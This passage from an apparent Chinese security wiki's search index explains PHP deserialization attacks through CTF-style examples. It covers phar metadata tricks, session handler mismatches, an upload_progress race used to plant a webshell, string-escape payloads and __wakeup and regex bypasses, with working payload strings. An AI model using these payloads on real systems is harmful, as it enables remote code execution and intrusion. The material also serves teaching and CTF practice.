manifest:phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u6f0f\u6d1e\u5229\u7528\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 content:\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9 signature (\u53ef\u7a7a):\u7b7e\u540d\uff0c\u653e\u5728\u672b\u5c3e\u3002 phar demo \u00b6 \u6839\u636e\u6587\u4ef6\u7ed3\u6784\u6211\u4eec\u6765\u81ea\u5df1\u6784\u5efa\u4e00\u4e2aphar\u6587\u4ef6\uff0cphp\u5185\u7f6e\u4e86\u4e00\u4e2aPhar\u7c7b\u6765\u5904\u7406\u76f8\u5173\u64cd\u4f5c \u8981\u5c06php.ini\u4e2d\u7684phar.readonly\u9009\u9879\u8bbe\u7f6e\u4e3aOff\uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6 <?php class TestObject { public $data ; } //@unlink(\"phar.phar\"); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $o -> data = 'hello' ; $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> \u8bbf\u95ee\u540e\uff0c\u4f1a\u751f\u6210\u4e00\u4e2aphar.phar\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230meta-data\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\u3002 \u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u90e8\u5206\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5217\u8868\uff1a fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / `fopen`` file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy \u4ee5\u5e38\u7528\u7684\u51fd\u6570 file_get_contents() \u51fd\u6570\u4e3e\u4f8b\uff1a <?php class TestObject { function __destruct () { echo $this -> data ; // TODO: Implement __destruct() method. } } file_get_contents ( 'phar://phar.phar/test.txt' ); \u4e0a\u8ff0\u4f8b\u7a0b\u4f1a\u8f93\u51fahello \u6f0f\u6d1e\u5229\u7528\u6761\u4ef6 \u00b6 phar\u6587\u4ef6\u8981\u80fd\u591f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7aef\u3002 \u8981\u6709\u53ef\u7528\u7684\u9b54\u672f\u65b9\u6cd5\u4f5c\u4e3a\u201c\u8df3\u677f\u201d\u3002 \u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4e14 : \u3001 / \u3001 phar \u7b49\u7279\u6b8a\u5b57\u7b26\u6ca1\u6709\u88ab\u8fc7\u6ee4\u3002 \u7ed5\u8fc7\u65b9\u5f0f \u00b6 \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528 compress.bzip2:// \u548c compress.zlib:// \u7b49\u7ed5\u8fc7 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt php://filter/read=convert.base64-encode/resource=phar://test.phar/test.txt GIF\u683c\u5f0f\u9a8c\u8bc1\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u5934\u90e8\u6dfb\u52a0GIF89a\u7ed5\u8fc7 $phar->setStub(\"GIF89a\".\" <?php __HALT_COMPILER (); ?> \"); //\u8bbe\u7f6estub \u751f\u6210\u4e00\u4e2aphar.phar\uff0c\u4fee\u6539\u540e\u7f00\u540d\u4e3aphar.gif \u7136\u540e\u4e0a\u4f20\uff0c\u901a\u8fc7 file_get_contents \u6216\u8005 unlink \u7b49\u65b9\u6cd5\u89e3\u5305\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\uff08\u901a\u5e38\u4f7f\u7528\u5728\u6ca1\u6709\u660e\u663e\u53cd\u5e8f\u5217\u5316\u4f20\u53c2\u7684\u9898\u76ee\u4e2d\uff09 php-session\u53cd\u5e8f\u5217\u5316 \u00b6 session\u4ecb\u7ecd \u00b6 \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0c session_start() \u51fd\u6570\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u7684Session ID\uff0c\u5e76\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u54cd\u5e94\u5934\uff0c\u5c06\u8fd9\u4e2aSession ID\u4fdd\u5b58\u5230\u5ba2\u6237\u7aefCookie\u4e2d\u3002 \u540c\u65f6\uff0c\u4e5f\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e00\u4e2a\u4ee5Session ID\u547d\u540d\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8fd9\u4e2a\u7528\u6237\u7684\u4f1a\u8bdd\u4fe1\u606f\u3002 \u5f53\u540c\u4e00\u4e2a\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u4e5f\u4f1a\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u8bf7\u6c42\u5934\u5c06Cookie\u4e2d\u4fdd\u5b58\u7684Seesion ID\u518d\u643a\u5e26\u8fc7\u6765\uff0c\u8fd9\u65f6 session_start() \u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u53bb\u5206\u914d\u4e00\u4e2a\u65b0\u7684Session ID\uff0c\u800c\u662f\u5728\u670d\u52a1\u5668\u7684\u786c\u76d8\u4e2d\u53bb\u5bfb\u627e\u548c\u8fd9\u4e2aSession ID\u540c\u540d\u7684Session\u6587\u4ef6\uff0c\u5c06\u8fd9\u4e4b\u524d\u4e3a\u8fd9\u4e2a\u7528\u6237\u4fdd\u5b58\u7684\u4f1a\u8bdd\u4fe1\u606f\u8bfb\u51fa\uff0c\u5728\u5f53\u524d\u811a\u672c\u4e2d\u5e94\u7528\uff0c\u8fbe\u5230\u8ddf\u8e2a\u8fd9\u4e2a\u7528\u6237\u7684\u76ee\u7684\u3002 session\u7684\u5b58\u50a8 \u00b6 php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5**\u6587\u4ef6**\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff08\u7531\u914d\u7f6e\u9879 session.save_handler \u5b9a\u4e49\uff09 \u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5 sess_sessionid \u6765\u8fdb\u884c\u547d\u540d\u7684 \u9664\u4e86\u9ed8\u8ba4\u7684php\u5f15\u64ce\u4e4b\u5916\uff0c\u8fd8\u5b58\u5728\u5176\u4ed6\u5f15\u64ce\uff0c\u4e0d\u540c\u7684\u5f15\u64ce\u6240\u5bf9\u5e94\u7684session\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0d\u76f8\u540c \u5904\u7406\u5f15\u64ce\u540d\u79f0 \u50a8\u5b58\u683c\u5f0f php \u952e\u540d + \u7ad6\u7ebf + \u7ecf\u8fc7 serialize() \u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26 + \u952e\u540d + \u7ecf\u8fc7 serialize() \u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c php_serialize \u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684**\u6570\u7ec4** \u5373\u5728**\u9ed8\u8ba4\u5f15\u64ce**\u60c5\u51b5\u4e0b\uff0c $_SESSION['name'] = 's1ng'; \u4ee3\u7801\u4f1a\u5728 /var/lib/php/sessions/ (\u4e5f\u53ef\u80fd\u5728 /tmp/sess_ )\u4e0b\u521b\u5efa sess_at9ih163p9tadfhdn8f721l7s9 \u6587\u4ef6\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u4e3a name|s:4:\"s1ng\"; \u82e5\u5728**php_serialize\u5f15\u64ce**\u4e0b\uff1a ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['name'] = 's1ng'; \u53ef\u4ee5\u5f97\u5230\uff1a ;root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9 a:1:{s:4:\"name\";s:4:\"s1ng\";} a:1 \u662f\u4f7f\u7528php_serialize\u8fdb\u884c\u5e8f\u5217\u8bdd\u90fd\u4f1a\u52a0\u4e0a\u3002\u540c\u65f6\u4f7f\u7528php_serialize\u4f1a\u5c06session\u4e2d\u7684key\u548cvalue\u90fd\u4f1a\u8fdb\u884c\u5e8f\u5217\u5316\u3002 \u5728**php_binary\u5f15\u64ce**\u4e0b\uff1a ini_set('session.serialize_handler', 'php_binary'); session_start(); $_SESSION['name'] = 's1ng'; \u8f93\u51fa\uff1a root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9 \uff08\u8fd9\u91cc\u6709\u4e00\u4e2aascii\u4e3a4\u7684\u4e0d\u53ef\u663e\u5b57\u7b26\uff09names:4:\"s1ng\"; php-session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6210\u56e0 \u00b6 PHP\u5728\u53cd\u5e8f\u5217\u5316\u5b58\u50a8\u7684 $_SESSION \u6570\u636e\u65f6\u4f7f\u7528\u7684\u5f15\u64ce\u548c\u5e8f\u5217\u5316\u4f7f\u7528\u7684\u5f15\u64ce\u4e0d\u4e00\u6837\uff0c\u4f1a\u5bfc\u81f4\u6570\u636e\u65e0\u6cd5\u6b63\u786e\u7684\u53cd\u5e8f\u5217\u5316\u3002 \u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6570\u636e\u5305\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u7a0b\u5e8f\u7684\u9a8c\u8bc1\u6216\u8005\u662f\u6267\u884c\u4e00\u4e9b\u7cfb\u7edf\u7684\u65b9\u6cd5 $_SESSION['hello'] = '|O:8:\"stdClass\":0:{}'; \u4e0a\u9762\u7684 $_SESSION \u6570\u636e\uff0c\u5728\u5b58\u50a8\u65f6\u4f7f\u7528\u7684\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e3a php_serialize\uff0c\u5b58\u50a8\u7684\u683c\u5f0f\u5982\u4e0b: a:1:{s:5:\"hello\";s:20:\"|O:8:\"stdClass\":0:{}\";} \u5728\u8bfb\u53d6\u6570\u636e\u65f6\u5982\u679c\u7528\u7684\u53cd\u5e8f\u5217\u5316\u5904\u7406\u5668\u4e0d\u662f php_serialize\uff0c\u800c\u662f php \u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u5c06\u4f1a\u53d8\u6210\uff1a array(1) { [\"a:1:{s:5:\"hello\";s:20:\"\"]=> object(stdClass)#1 (0) { } } \u56e0\u4e3a\u5f53\u4f7f\u7528php\u5f15\u64ce\u7684\u65f6\u5019\uff0cphp\u5f15\u64ce\u4f1a\u4ee5 | \u4f5c\u4e3a\u4f5c\u4e3akey\u548cvalue\u7684\u5206\u9694\u7b26\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06 a:1:{s:5:\"hello\";s:20:\" \u4f5c\u4e3aSESSION\u7684key\uff0c\u5c06 O:8:\"stdClass\":0:{} \u4f5c\u4e3avalue\uff0c\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6700\u540e\u5c31\u4f1a\u5f97\u5230stdClass\u8fd9\u4e2a\u7c7b\u3002 \u6f0f\u6d1e\u5229\u7528 \u00b6 session.auto_start=Off // foo1.php <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); $_SESSION [ 'test' ] = $_GET [ 'test' ]; ?> // foo2.php <?php session_start (); //\u6b64\u65f6\u9ed8\u8ba4\u4f7f\u7528php\u5f15\u64ce\u4e86 class test { var $hi ; function __wakeup () { echo 'hi,' ; } function __destruct () { echo $this -> hi ; } } \u8bbf\u95eefoo1\u521b\u5efasession\u5e76\u4ee5php-serialize\u5f15\u64ce\u65b9\u5f0f\u4fdd\u5b58\u672c\u5730\uff1a http://172.31.171.100/tmp/foo1.php?test=|O:4:\"test\":1:{s:2:\"hi\";s:4:John\";} \u518d\u8bbf\u95eefoo2\u4ee5php\u5f15\u64ce\u89e3\u6790\u672c\u5730session\u6587\u4ef6\uff0c\u53d1\u73b0\u6210\u529f\u6253\u5370\u51fa hi,John session.upload_progress \u5728php.ini\u6709\u4ee5\u4e0b\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879 session.upload_progress.enabled = on #\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d session.upload_progress.cleanup = on #\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9009\u9879\u975e\u5e38\u91cd\u8981 session.upload_progress.prefix = \"upload_progress_\" session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" session.upload_progress.freq = \"1%\" session.upload_progress.min_freq = \"1\" RCE < form action = \"http://e39d4115-3c33-4a6d-bd2c-2d2edb584f0d.chall.ctf.show:8080/\" method = \"POST\" enctype = \"multipart/form-data\" > < input type = \"text\" name = \"PHP_SESSION_UPLOAD_PROGRESS\" value = \"123\" /> < input type = \"file\" name = \"file\" id = \"file\" > < input type = \"submit\" name = \"submit\" value = \"submit\" > \u8fd9\u91cc\u9762\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\u5c31\u4f1a\u88ab\u5199\u5165sess_flag\u91cc\u9762 \u7531\u4e8e\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0csession.upload_progress.cleanup\u662f\u5f00\u542f\u7684\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528**\u6761\u4ef6\u7ade\u4e89**\uff0c\u8981\u8d76\u5728\u8fd8\u6ca1\u6709\u8bfb\u53d6\u5b8cpost\u5305\u4e0a\u4f20\u7684\u6570\u636e\u7684\u65f6\u5019\u5c31\u8bbf\u95ee\u5230\u8fd9\u4e2asess_flag\u6587\u4ef6\uff0c\u6267\u884c\u91cc\u9762\u7684\u4ee3\u7801 \u53cd\u5e8f\u5217\u5316 <?php //A webshell is wait for you ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class OowoO { public $mdzz ; function __construct () { $this -> mdzz = 'phpinfo();' ; } function __destruct () { eval ( $this -> mdzz ); } } if ( isset ( $_GET [ 'phpinfo' ])) { $m = new OowoO (); } else { highlight_string ( file_get_contents ( 'index.php' )); } ?> \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86php\u5f15\u64ce\uff0c\u4f46\u662f\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u63a7\u5236\u5e8f\u5217\u5316\u7684\u70b9\u3002 \u901a\u8fc7\u67e5\u770bphpinfo\u53d1\u73b0session.upload_progress.enabled\u6253\u5f00\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u5229\u7528\u5176\u5411session\u4e2d\u5199\u5165\u6570\u636e\u3002 \u7b2c\u4e00\u6b65\u8ddfrce\u4e00\u6837\uff0c\u672c\u5730\u6784\u9020\u4e00\u4e2a\u5305\u542b PHP_SESSION_UPLOAD_PROGRESS \u7684POST\u6570\u636e\u5305\uff0c\u5728cookie\u4e2d\u6dfb\u52a0 PHPSESSID \u503c\u4e3a\u81ea\u5b9a\u4e49\u7684\u4efb\u610f\u5b57\u7b26\u4e32 \u63a5\u4e0b\u6765\u5c31\u8981\u6784\u9020payload\u4f5c\u4e3afilename\u7684\u503c\u63d0\u4ea4\uff0c\u4ece\u800c\u8d4b\u503c\u7ed9session <?php Class OowoO { public $mdzz = 'print_r(scandir(dirname(__FILE__)));' ; } $obj = new OowoO (); $ser = serialize ( $obj ); $ser = addslashes ( $ser ); $ser = str_replace ( \"O:5\" , \"|O:5\" , $ser ); echo $ser ; //|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} PHPSESSID\u5fc5\u987b\u8981\u6709\uff0c\u56e0\u4e3a\u8981\u7ade\u4e89\u540c\u4e00\u4e2a\u6587\u4ef6 filename\u53ef\u63a7\uff0c\u4f46\u662f\u5728\u503c\u7684\u6700\u524d\u9762\u52a0\u4e0a | ,\u56e0\u4e3a\u6700\u7ec8\u76ee\u7684\u662f\u5229\u7528session\u7684\u53cd\u5e8f\u5217\u5316\uff0c PHP_SESSION_UPLOAD_PROGRESS \u53ea\u662f\u4e2a\u8df3\u677f \u5176\u6b21\u628a\u5b57\u7b26\u4e32\u4e2d\u7684\u53cc\u5f15\u53f7\u8f6c\u4e49\uff0c\u4ee5\u9632\u6b62\u4e0e\u6700\u5916\u5c42\u7684\u53cc\u5f15\u53f7\u51b2\u7a81 \u5728\u8fd9\u4e2a\u9875\u9762\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6293\u5305\u4fee\u6539 filename \u7684\u503c\uff0cfilename\u7684\u503c\u4e5f\u5c31\u4f1a\u88ab\u5e8f\u5217\u5316\u8fdbsess_123\u6587\u4ef6\u4e2d\u4e86 \u6240\u4ee5\u603b\u7684\u6765\u8bf4\uff0c\u5229\u7528session.upload_progress\u7684\u524d\u63d0\u8fd8\u662f\u5f97\u5b58\u50a8session\u6570\u636e\u548c\u8bfb\u53d6session\u6570\u636e\u7684\u5f15\u64ce\u4e0d\u4e00\u81f4\uff0c\u8981\u6c42\u5b58\u50a8\u65f6\u662fphp_serialize\uff0c\u8bfb\u53d6\u65f6\u662fphp\u3002 \u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038 \u00b6 \u5b57\u7b26\u9003\u9038\u7684\u672c\u8d28\u5176\u5b9e\u4e5f\u662f\u95ed\u5408\uff0c\u4f46\u662f\u5b83\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u662f\u5b57\u7b26\u53d8\u591a\uff0c\u4e8c\u662f\u5b57\u7b26\u53d8\u5c11 \u5b57\u7b26\u53d8\u591aweb262 \u00b6 **\u540e\u7aef**\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u8fdb\u884c**\u66ff\u6362**\u6210\u4e3a**\u957f\u5ea6\u66f4\u957f**\u7684\u5b57\u7b26 function change($str){ return str_replace(\"x\",\"xx\",$str); } \u5c06x\u66ff\u6362\u4e3axx\uff0c\u518d\u8fdb\u884c\u53cd\u5e8f\u5217\u5316 \u7531\u4e8e\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u6bcf\u4e2a\u7684\u683c\u5f0f\u7c7b\u4f3c\u4e8e s:4:\"play\" \uff0c\u7136\u800c\u7ecf\u8fc7\u66ff\u6362\u540e\u5b57\u7b26\u4e32\u957f\u5ea6\u53d8\u957f\uff0c\u548c\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u81f4\u4e86\uff0c\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u62a5\u9519 \u6211\u4eec\u4f20\u5165 name=maoxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"woaini\";} \";i:1;s:6:\"woaini\";} \u8fd9\u4e00\u90e8\u5206\u4e00\u5171\u4e8c\u5341\u4e2a\u5b57\u7b26 20\u4e2ax\u88ab\u66ff\u6362\u4e3a40\u4e2a\uff0c\u591a\u51fa\u6765\u768420\u4e2ax\u5176\u5b9e\u53d6\u4ee3\u4e86\u6211\u4eec\u7684\u8fd9\u4e8c\u5341\u4e2a\u5b57\u7b26 \";i:1;s:6:\"woaini\";} \uff0c\u4ece\u800c\u9020\u6210 \";i:1;s:6:\"woaini\";} \u7684\u6ea2\u51fa \u800c\"\u95ed\u5408\u4e86\u524d\u4e32\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u6210\u529f\u9003\u9038\uff0c\u53ef\u4ee5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u8f93\u51fawoaini \u539f\u6765\u7684 \";i:1;s:7:\"I am 11\";}\" \u88ab\u820d\u5f03\uff0c\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b \u5b57\u7b26\u53d8\u5c11 \u00b6 function change($str){ return str_replace(\"xx\",\"x\",$str); } \u4e24\u4e2axx\u88ab\u66ff\u6362\u4e3a\u4e00\u4e2ax\uff0c\u7136\u540e\u518d\u53cd\u5e8f\u5217\u5316 \u6211\u4eec\u8f93\u5165 name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&age=11\";s:3:\"age\";s:6:\"woaini\";} \u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\u662f s:3:\"age\";s:28:\"11\";s:3:\"age\";s:6:\"woaini\";}\" \u7531\u4e8e\u524d\u9762\u662f40\u4e2ax\u6240\u4ee5\u5bfc\u81f4\u5c11\u4e8620\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u540e\u9762\u6765\u8865\u4e0a\uff0c \";s:3:\"age\";s:28:\"11 \u8fd9\u4e00\u90e8\u5206\u521a\u597d20\u4e2a\uff0c\u540e\u9762\u7531\u4e8e\u6709 \" \u95ed\u5408\u4e86\u524d\u9762\u56e0\u6b64\u540e\u9762\u7684\u53c2\u6570\u5c31\u53ef\u4ee5\u7531\u6211\u4eec\u81ea\u5b9a\u4e49\u6267\u884c\u4e86 \u5c0ftrick \u00b6 php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f \u00b6 \u5982\u679c\u53d8\u91cf\u524d\u662f protected \uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 \u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f\uff0c\u5373\u4f7f\u6ca1\u6709 \\x00*\\x00 \u4e5f\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u8d4b\u503c \u7ed5\u8fc7__wakeup(CVE-2016-7124) \u00b6 PHP5 < 5.6.25 PHP7 < 7.0.10 \u5229\u7528\u65b9\u5f0f\uff1a\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c \u628a O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";} \u6539\u4e3a O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";} \u5373\u53ef\u4e0d\u6267\u884c __wakeup \u65b9\u6cd5 \u7ed5\u8fc7\u90e8\u5206\u6b63\u5219 \u00b6 preg_match('/^O:\\d+/') \u5728\u53cd\u5e8f\u5217\u5316\u524d\u8fc7\u6ee4 O:4 \u5f00\u5934\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u6b64\u65f6\u53cd\u5e8f\u5217\u5316\u6784\u9020\u4e3a $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'; \u6cd5\u4e00\uff1a\u4f7f\u7528+\u7ed5\u8fc7 $b = str_replace('O:4','O:+4', $a); // O:+4:\"test\":1:{s:1:\"a\";s:3:\"abc\";} \u6cd5\u4e8c\uff1a\u5916\u9762\u518d\u5957\u4e2a\u6570\u7ec4 serialize(array($a)); // a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}} a:array\u4ee3\u8868\u662f\u6570\u7ec4\uff0c\u540e\u9762\u76841\u8bf4\u660e\u67091\u4e2a\u5c5e\u6027 i:\u4ee3\u8868\u662f\u6574\u578b\u6570\u636eint\uff0c\u540e\u9762\u76840\u662f\u6570\u7ec4\u4e0b\u6807 s:\u4ee3\u8868\u662f\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u76843\u662f\u56e0\u4e3aabc\u957f\u5ea6\u4e3a3 \u5229\u7528\u5f15\u7528web265 \u00b6 <?php class test { public $a ; public $b ; public function __construct (){ $this -> a = 'abc' ; $this -> b = & $this -> a ; } ?> \u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06b\u8bbe\u4e3aa\u7684\u5f15\u7528\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e00\u4e9b\u8fc7\u6ee4\u5224\u65ad <?php class ctfshowAdmin { public $token = \"dotast\" ; public $password = \"dotast\" ; public function login (){ return $this -> token === $this -> password ; } } $a = new ctfshowAdmin (); $a -> token =& $a -> password ; echo urlencode ( serialize ( $a )); // O:12:\"ctfshowAdmin\":2:{s:5:\"token\";s:6:\"dotast\";s:8:\"password\";R:2;} \u51fa\u73b0\u4e86\u4e0d\u5e38\u89c1\u7684 R \u53d8\u91cf \u5229\u7528 16 \u8fdb\u5236\u7ed5\u8fc7\u8fc7\u6ee4 \u00b6 \u5c06\u5b57\u7b26\u4e32\u7684 s \u6539\u4e3a\u5927\u5199 S \u65f6\uff0c\u5176\u503c\u4f1a\u89e3\u6790 16 \u8fdb\u5236\u6570\u636e \u4f8b\u5982\uff1a O:4:\"Test\":1:{s:3:\"cmd\";s:6:\"whoami\";} \u53ef\u6539\u4e3a\uff1a O:4:\"Test\":1:{S:3:\"\\\\63md\";S:6:\"\\\\77hoami\";} \u4ece\u800c\u7ed5\u8fc7\u9488\u5bf9\u53d8\u91cf\u540d\u7684\u8fc7\u6ee4 \u540c\u65f6\u5b58\u5728unserialize\u548cwakeup \u00b6 \u5982\u679c __unserialize() \u548c __wakeup() \u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\u90fd\u5b9a\u4e49\u5728\u7528\u4e00\u4e2a\u5bf9\u8c61\u4e2d\uff0c \u5219\u53ea\u6709 __unserialize() \u65b9\u6cd5\u4f1a\u751f\u6548\uff0c __wakeup() \u65b9\u6cd5\u4f1a\u88ab\u5ffd\u7565","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php","text":"","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u5f53\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26(public\u3001protected\u3001private)\u4e0d\u540c\u65f6\uff0c\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\u4e5f\u4e0d\u540c public \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u53d8\u91cf\u540d\u4e0d\u4f1a\u66f4\u6539 protected \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00*\\x00 private \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00\u7c7b\u540d\\x00 \u8bbf\u95ee\u4fee\u9970\u7b26 Public Protected Private \u672c\u7c7b \u53ef\u4ee5\u8bbf\u95ee \u53ef\u4ee5\u8bbf\u95ee \u53ef\u4ee5\u8bbf\u95ee \u5b50\u7c7b \u53ef\u4ee5\u8bbf\u95ee 